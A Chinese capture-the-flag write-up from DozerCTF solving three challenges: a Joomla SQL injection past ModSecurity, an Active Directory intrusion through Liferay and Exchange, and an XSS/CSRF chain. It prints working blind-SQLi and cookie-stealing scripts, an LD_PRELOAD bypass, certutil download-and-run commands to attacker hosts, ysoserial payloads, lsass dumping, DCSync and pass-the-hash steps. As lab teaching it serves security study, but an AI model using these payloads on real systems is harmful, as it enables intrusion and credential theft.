## babay waf

### 题目描述

刚搭了个开源的waf-modsecurity,这样师傅们应该就没办法了吧(狗头).

### 出题思路

本题是实战中遇到的一个环境,本地还原了一下.主要还是在套娃,没什么新姿势.

### 解题过程

拿到题目很显然题目是joomla cms,想办法查看版本,可以通过默认安装的语言包获得.

访问/language/en-GB/en-GB.xml获取到版本为2.5.28和hint

hint为hashcat的掩码,结合另一个hint编辑器可以找到漏洞sql注入漏洞[Joomla Component JCK Editor 6.4.4 - 'parent' SQL Injection](https://www.exploit-db.com/exploits/45423).

但是由于modsecurity存在,payload会被拦截.

找到[modsecurity sql注入 bypass 的方法](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1167),构造出盲注的payload:

```
a" or {`if`(left((select username from fqf89_users limit 0,1),1)='a')} -- -
```

简单盲注跑一下

```
import requests

url="http://web12138.dozerjit.club:8086/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent="

length=len(requests.get(url+"a\" or {`if`(1=1)} -- -").text)
ret=""
for i in range(1,40):
    for j in range(20,128):
        payload="a\" or {`if`(ascii(substr((select password from fqf89_users limit 0,1),%s,1))=%d)} -- -"%(i,j)
        r=requests.get(url+payload)
        #print  payload
        if len(r.text)==length:
            ret=ret+str(chr(j))
            print ret
```

在有其他用户注册的情况下,还有师傅用报错得到了hash...

不是很明白users表只有一条数据的时候为什么不行..机缘巧合之下题目难度被降低了...

```
1 " and{`if`updatexml(1,concat(0x3a,(select /*!50000(((password))) from/*!50000fqf89_users*/ limit 1,1)),1)}#
```

对hash进行破解:

```
hashcat.exe -a 3 -m 400 '$P$DTCPSnZSPuO1eZWjIqKm0CZFe8/GgY0' ?u?d?a?d?a?
```

得到明文密码D0z3r,进入后台通过上传语言包getshell.

一般的一句话木马流量特征会被检测到,使用冰蝎即可绕过流量检测.发现开启了disable_functions,使用ld_preload绕过即可执行搜索命令.

```
#include<stdlib.h>
#include<stdio.h>
#include<string.h>
void payload(){
system("grep -nR \"Dozerctf\" /var/www/html > /var/www/html/language/result.txt");
} 
int geteuid(){
if(getenv("LD_PRELOAD") ==NULL) {
return 0;}
unsetenv("LD_PRELOAD");
payload();
}
```

编译
```
root@ubuntu:~# gcc -c -fPIC a.c -o a
root@ubuntu:~# gcc -shared a -o a.so
```

编写php:
```
<?php
   putenv("LD_PRELOAD=/var/www/html/a.so");
   mail("[email protected]","","","","");
?>
```

上传并执行,获取flag:

```
/var/www/html/modules/mod_finder/helper.php:90:/*Dozerctf{da6776e7ec7eaa7a6f3df5c6b149127em}*/
Binary file /var/www/html/a.so matches
```

## 简单域渗透

### 题目描述

都是最基础redteam技能...大佬门不要搅屎,求放过...

### 出题思路

想出个简单的域环境,尽量多的涵盖一些redteam技能,要陪女朋友(其实就是懒),所以就只出了三个机器,知识点也不是很多.

很多东西没涉及到,如简单的横向移动(wmic,schtasks,winrs等),个人机上的一些信息的获取(firefox,chrome凭证,windows凭据管理器等),本地提权(juicy photo,exp),域提权(gpp,14068,ntlm relaty等)等等等等.

杀软随便找了个360(主要是免费),直接给了师傅们本机管理员等等都降低了难度,和实战的环境相差比较多.

环境会由学弟打包共享给大家,大家可以进一步充实这个环境.

比较推荐的红队wiki:ired.team

### 解题过程

外网是一个liferay,结合之前的cve-2020-7961可以直接rce.这里环境没有为难大家,直接是可以出网的机器,可以直接使用certutil下载荷载或者webshell进行内网渗透,否则还需要构造不出网的exp.

出网的exp可以直接使用[CVE-2020-7961](https://github.com/b33p-b0x/CVE-2020-7961-payloads)

先将.java编译成字节码.class:

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
public class LifExp {

static {

try {
            String[] cmd = {"cmd.exe", "/c", "whoami"};
            Process process=java.lang.Runtime.getRuntime().exec(cmd);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String s= stdInput.readLine();
            String[] cmd2 = {"cmd.exe", "/c", "certutil.exe -urlcache -split -f http://vps/"+s+""};
            java.lang.Runtime.getRuntime().exec(cmd2);
        } catch ( Exception e ) {
            e.printStackTrace();
        }
}
}
```

编译:

```
javac LifExp.java
```

启动脚本:

```
python poc.py -t http://web1616.dozerjit.club:8086 -l vps -p 8080
```

这里有坑,vps地址不能填0.0.0.0,这里的地址有两个作用.一是作为vps webserver的监听的地址,二是会被写进payload,作为目标请求远程payload的地址.

将poc中webserver监听相关的注释,-l 为vps公网地址.手动启动SimpleHTTPServer 监听0.0.0.0.

(手动构造反序列化payload的师傅不会遇到这些问题)

确认漏洞存在后,使用cs或msf等工具生成的exe会被杀,确认一下杀软:

```
tasklist /svc
dir c:\progra~1
dir c:\progra~2
```

发现是360,师傅们可以选择c2的荷载免杀来绕过,这里我们进行曲线救国,不使用c2进行内网渗透.找个目录放websll即可.

(有些师傅powershell能弹shell之后又不行了是360的问题)


在桌面上找到第一个flag:

```
Dozerctf{a993e8ce377e05b2cbfa460e43e43757}
```

进行简单的域内信息搜集,列出域信任关系

```
nltest /domain_trusts
```

环境为单域,查看ip信息,一般dns服务器就是dc:

```
ipconfig /all
```

获得当前机器的hash:

```
reg save hklm\sam sam
reg save hklm\system system

mimikatz # lsadump::sam /sam:sam /system:system
Domain : DOZER-DMZ01
SysKey : f443141fcbd9a35c64370d36a05f8e70
Local SID : S-1-5-21-1495210691-4001662545-2502461571

SAMKey : 5f0f962fafd8bc2a549097e62597e6bc

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003e9 (1001)
User : root
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
    lm  - 0: 4364da8b9c9e89eff083dc130b360e4b
    ntlm- 0: e19ccf75ee54e06b06a5907af13cef42
    ntlm- 1: 1aface37f4f4843d3f534c73716b9a7e
```

得到本地管理员hash,破解明文为P@ssw0rd,查看c盘用户目录发现最近有shark用户登陆过,可以通过systeminfo的启动时间和目录修改时间进行对比,一般目录修改时间晚于重启时间才能在内存里抓到这个用户.

(因为有hxd搅屎的缘故,机器重启了,忘记登陆了,中间内存出了点问题,shark的hash有一段时间是错的)

转储内存抓域凭证:

```
procdump64.exe -ma -accepteula lsass.exe 1.dmp 或者 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 560 C:\programdata\1.dmp full

mimikatz # sekurlsa::minidump lass.dmp
Switch to MINIDUMP : 'lass.dmp'
mimikatz # sekurlsa::logonpasswords
```

获取到了一个域用户shark的密码,依然是P@ssw0rd. 其实就算不抓内存有经验的师傅也会想到用本机密码试一试,如何试比较简单的方式就是连一下自己的共享

```
net use \\127.0.0.1 /user:dozer\shark "P@ssw0rd"
```

接下来就是域内信息搜集,使用dsquery去导出域信息.

```
dsquery * /s 10.10.10.3 /u shark /p P@ssw0rd -attr * -limit 0 > 1.txt
```

域信息是ldap结构的,dsquery导出的其实和net user /domain 等命令执行是一样的.

在用户信息里搜索到第二个flag:

```
cn: flagflag
sn: flag
distinguishedName: CN=flagflag,CN=Users,DC=dozer,DC=org
instanceType: 4
whenCreated: 05/16/2020 17:35:13
whenChanged: 05/16/2020 17:37:11
displayName: flag
uSNCreated: 38671
uSNChanged: 38683
company: Dozerctf{3fed7db7fee7a1771b58d309bf9ca851}
```

同时发现组内有exchange服务器

```
member: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Objects,DC=dozer,DC=org
member: CN=DOZER-EXCHANGE,CN=Computers,DC=dozer,DC=org
```

使用regeorg代理进内网(方式很多,甚至还有师傅frp了rdp)

```
python reGeorgSocksProxy.py -u http://web1616.dozerjit.club:8086/errors/tunnel.jsp -l 0.0.0.0 -p 1081
```

访问https://dozer-exchange.dozer.org

已知一个域内普通账户和exchange,熟悉ad的话很容易想到cve-2020-0688(这里exchange ssrf应该也是存在的,结合ntlm relay 也是一种思路).先看看这个邮箱账户等不能登陆.

在mailbox里获取到第三个flag.

```
Dozerctf{9b35c916c37b00f3359d49b6c9c99667}
```

cve2020-0688 github几个漏洞工具都无法执行命令,匹配session的地方有问题,手工生成payload获取到exchange权限.

```
 ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping mydatahere.2d5facd857db3251fd2c.d.zhack.ca" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="d5413748-06a2-4774-8b8a-515ddaf5f383" --isdebug -islegacy
```

详情参考:https://www.freebuf.com/vuls/228681.html

这台机器上没有360,直接使用c2方便执行命令.当然也可以在excheng的owa/auth目录或者exp/auth目录放shell,默认是system权限,在root用户桌面上找到第四个flag

```
certutil.exe -urlcache -split -f "http://39.97.163.55:8080/1.exe" c:\windows\temp\1.exe && 1.exe
```

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "certutil.exe -urlcache -split -f "http://39.97.163.55:8080/1.exe" c:\windows\temp\1.exe && c:\windows\temp\1.exe" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="d5413748-06a2-4774-8b8a-515ddaf5f383" --isdebug -islegacy
```

访问:

```
https://10.10.10.4/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2fwEygggAAQAAAP%2f%2f%2f%2f8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACkBjw%2feG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8%2bDQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vMzkuOTcuMTYzLjU1OjgwODAvMS5leGUgYzpcd2luZG93c1x0ZW1wXDEuZXhlICZhbXA7JmFtcDsgYzpcd2luZG93c1x0ZW1wXDEuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8%2bDQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsMDg4FT7ljhPqGSZN4Nls5Uth%2bCw%3D%3D
```


```
Dozerctf{1193173239563ee49664b5e500f687ba}
```

尝试在exchange上抓hash,如果域管登过且没重启就可以拿到域管hash,如果没有则利用exchange writeacl 给普通用户dcsync的权限,去同步域管的hash.

具体可以参考:[域渗透——使用Exchange服务器中特定的ACL实现域提权](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83/)

首先在导出的域信息里找到Exchange Trusted Subsystem组的dn:

```
CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=dozer,DC=org
```

添加shark用户对exchange组的完全访问权限.

```
$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=dozer,DC=org" -Raw
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity shark -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
```

将shark加入Exchange Trusted Subsystem组

```
import-module .\Microsoft.ActiveDirectory.Management.dll
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members shark
```

至此shark具有了dcsync的权限,我们网络是通的并且有密码,可以直接在本地dcsync或者上传mimikatz到exchange上同步:

首先先添加凭证,再同步hash

```
cmdkey /add:dozer-dc.dozer.org /user:shark /pass:P@ssw0rd

lsadump::dcsync /domain:dozer /dc:dozer-dc /all
```

获得域管hash后无法破解,在本地使用mimikatz pth 横向移动到dc上.

```
privilege::debug
sekurlsa::pth /user:administator /domain:dozer /ntlm:4aefab3403a99c6037fbe7f382a881f6
```

查看管理员桌面得到第五个flag:


```
type \\10.10.10.3\c$\users\administrator\desktop\flag.txt
```

Dozerctf{9e81075297066f2275ba49ede1cbe3cc}


## fake phpminiadmin

### 题目描述

山寨phpminiadmin

### 出题思路

福利题,简化了2018巅峰极客L3m0n师傅出的题目.

### 解题过程

执行sql语句处利用hex可以进行xss,结合contact功能处的csrf可以组合利用.

```
select 0x3c7363726970743e616c6572742831293c2f7363726970743e
```

成功弹窗

生成csrf payload
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://xxx/sql.php" method="POST">
      <input type="hidden" name="sql" value="select 0x...." />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

编码前的xss payload为:

```
<script>self.location = 'http://vps/?v=aaa'+btoa(document.cookie)+'aaa';</script>
```

将csrf的payload放在vps上,在contact处提交vps上payload的地址.

在放payload的vps上发现referer是后台地址,访问提示需要登陆地点错误.

修改payload后读取后台源码获得flag.

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/sql.php" method="POST">
      <input type="hidden" name="sql" value="select 0x...." />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

使用xss平台等方式读取:

```
var u = 'http://vps/';
var cr;
if (document.charset) {
	    cr = document.charset
} else if (document.characterSet) {
	    cr = document.characterSet
};
function createXmlHttp() {
	    if (window.XMLHttpRequest) {
		            xmlHttp = new XMLHttpRequest()
		        } else {
				        var MSXML = new Array('MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');
				        for (var n = 0; n < MSXML.length; n++) {
						            try {
								                    xmlHttp = new ActiveXObject(MSXML[n]);
								                    break
								                } catch(e) {}
						        }
				    }
}
createXmlHttp();
xmlHttp.onreadystatechange = writeSource;
xmlHttp.open("GET", "http://127.0.0.1/admin_shark.php", true);
xmlHttp.send(null); 	
function postSource(cc) {
	    url = u;
	    cc = "mycode=" + escape(cc);
	    window.location.href =u+cc;
}
function writeSource() {
	    if (xmlHttp.readyState == 4) {
		            var c = new postSource(xmlHttp.responseText)
		        }
}
```

获取到flag:

```
Dozerctf{eed8cdc400dfd4ec85dff70a170066b7}
```